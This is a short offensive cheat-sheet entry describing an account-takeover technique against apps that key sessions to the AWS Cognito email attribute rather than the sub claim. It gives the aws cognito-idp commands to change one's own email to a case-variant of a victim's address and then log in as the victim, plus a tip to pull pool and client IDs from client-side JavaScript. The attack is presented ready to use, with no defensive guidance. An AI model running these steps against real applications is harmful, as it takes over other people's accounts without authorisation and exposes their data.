# Cognito Identity Confusion Account Takeover

If an app authenticates against AWS Cognito but binds sessions to the `email` attribute instead of the immutable `sub` claim, self-registering and then renaming your own email to a case-variant of a victim's hijacks their identity — no admin rights needed, since Cognito lets authenticated users self-update their own attributes.

```bash
# self-register via the app's own sign-up flow, log in, grab the access token from browser localStorage
export TOKEN='<your-own-access-token>'
aws cognito-idp get-user --region <region> --access-token $TOKEN
aws cognito-idp update-user-attributes --region <region> --access-token $TOKEN \
  --user-attributes Name=email,Value=Victim@target.tld     # case-variant of the real victim email
```
Log back into the app with your own known password — the app now treats you as the victim. Grep client-side JS bundles for `userPoolId`/`clientId` first; `aws cognito-idp` calls only need the bearer access token, not AWS account credentials.
